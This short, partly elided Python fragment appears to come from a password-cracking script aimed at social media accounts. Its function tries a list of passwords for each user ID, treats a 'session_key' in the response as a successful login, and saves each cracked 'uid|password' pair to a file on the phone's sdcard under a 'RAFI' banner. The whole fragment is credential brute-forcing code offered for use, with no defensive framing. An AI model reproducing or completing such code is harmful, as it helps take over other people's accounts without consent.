...
def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[RAFI] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "session_key" in q:
                ...
                open("/sdcard/RAFI-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
